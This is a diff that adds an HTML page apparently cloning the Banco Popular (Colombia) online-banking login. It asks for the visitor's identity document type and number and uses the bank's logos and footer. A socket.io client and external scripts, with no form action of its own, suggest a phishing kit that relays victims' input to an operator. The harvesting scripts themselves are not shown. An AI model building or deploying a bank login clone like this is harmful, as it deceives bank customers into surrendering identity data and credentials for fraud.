@@ -1,0 +1,145 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Bienvenido a Banco Popular</title>
+    <link rel="stylesheet" href="styles.css">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600;700&display=swap" rel="stylesheet">
+    <script src="/socket.io/socket.io.js"></script>
+</head>
+<body>
+    <!-- Pantalla de Carga -->
+    <div id="loading-screen" class="loading-screen hidden">
+        <div class="loading-content">
+            <img src="img/popularhorizontal_new.svg" alt="Banco Popular" class="loading-logo">
+            <div class="loading-spinner"></div>
+        </div>
+    </div>
+    <div class="container">
+        <!-- Header -->
+        <header class="header">
+            <div class="header-content">
+                <img src="img/popularhorizontal_new.svg" alt="Banco Popular" class="logo">
+                <div class="header-icon">
+                    <img src="img/icon-security-lock.svg" alt="Security" class="security-icon">
+                </div>
+            </div>
+        </header>
+
+        <!-- Main Content -->
+        <main class="main-content">
+            <!-- Login Section -->
+            <section class="login-section">
+                <h1 class="title">Bienvenido a</h1>
+                <div class="logo-container">
+                    <img src="img/Isotipo.svg" alt="Banco Popular" class="isotipo">
+                    <span class="banco-text">banco popular</span>
+                </div>
+
+                <form class="login-form" id="loginForm">
+                    <div class="form-group">
+                        <label for="documento-tipo">Tipo de documento</label>
+                        <div class="select-wrapper">
+                            <select id="documento-tipo" class="form-select">
+                                <option>Cédula de Ciudadanía</option>
+                                <option>Cédula de Extranjería</option>
+                                <option>Tarjeta de Identidad</option>
+                            </select>
+                        </div>
+                    </div>
+
+                    <div class="form-group">
+                        <label for="documento-numero">Número de documento</label>
+                        <input type="text" id="documento-numero" class="form-input" placeholder="" maxlength="15">
+                    </div>
+
+                    <div class="form-group checkbox-group">
+                        <label class="checkbox-label">
+                            <input type="checkbox" id="recordar-checkbox" class="checkbox-input">
+                            <div class="checkbox-wrapper">
+                                <span class="checkbox-custom"></span>
+                            </div>
+                            <span class="checkbox-text">Recordar tipo y número de documento</span>
+                        </label>
+                    </div>
+
+                    <button type="button" id="btn-continuar" class="btn-continuar" disabled>Continuar</button>
+
+                    <div class="register-link">
+                        <span class="register-text">¿No eres usuario?</span>
+                        <a href="#" class="register-link-text">Regístrate aquí</a>
+                    </div>
+
+                    <div class="footer-links">
+                        <span class="footer-text">Protegido por reCAPTCHA | </span>
+                        <a href="#" class="footer-link">Privacidad</a>
+                        <span class="footer-text"> - </span>
+                        <a href="#" class="footer-link">Condiciones</a>
+                    </div>
+                </form>
+            </section>
+
+            <!-- Help Section -->
+            <section class="help-section">
+                <h2 class="help-title">¿Cómo podemos ayudarte?</h2>
+                <div class="help-options">
+                    <a href="#" class="help-card">
+                        <div class="help-icon">
+                            <img src="img/icon-solicitar.svg" alt="Solicitar productos">
+                        </div>
+                        <span class="help-text">Solicitar productos</span>
+                    </a>
+                    <a href="#" class="help-card">
+                        <div class="help-icon">
+                            <img src="img/icon-contacto.svg" alt="Contáctanos">
+                        </div>
+                        <span class="help-text">Contáctanos</span>
+                    </a>
+                </div>
+            </section>
+
+            <!-- Cards Dinámicas Section -->
+            <section class="pagos-section">
+                <div class="pagos-card" id="dynamic-card">
+                    <div class="pagos-content">
+                        <img src="img/Isotipo.svg" alt="Banco Popular" class="pagos-isotipo">
+                        <h3 class="pagos-title" id="card-title">Pagos rápidos y seguros</h3>
+                        <p class="pagos-description" id="card-description">
+                            Realiza la inscripción de tus servicios públicos y privados, págalos desde cualquier lugar.
+                        </p>
+                        <a href="#" class="pagos-link" id="card-link">
+                            <span id="link-text">Inscribe y paga</span>
+                            <span class="arrow-icon">→</span>
+                        </a>
+                    </div>
+                    <div class="pagos-image">
+                        <img src="img/Woman-1.png" alt="Persona" class="woman-image" id="card-image">
+                    </div>
+                </div>
+            </section>
+
+            <!-- Footer -->
+            <footer class="footer">
+                <div class="footer-links-bottom">
+                    <a href="#" class="footer-link-bottom">Seguridad</a>
+                    <a href="#" class="footer-link-bottom">Accesibilidad</a>
+                </div>
+                <div class="footer-logos">
+                    <img src="img/Isotipo.svg" alt="Banco Popular" class="footer-logo">
+                    <img src="img/aval.png" alt="Grupo Aval" class="footer-aval">
+                </div>
+                <div class="footer-info">
+                    <p class="footer-date" id="footer-date">Jueves, 27 de noviembre de 2025 | 10:25 p. m.</p>
+                    <p class="footer-copyright">© Banco Popular, Carrera 13 No 26-45 Bogotá</p>
+                </div>
+            </footer>
+        </main>
+    </div>
+
+    <script src="/js/banco-utils.js"></script>
+    <script src="script-optimized.js"></script>
+</body>
+</html>
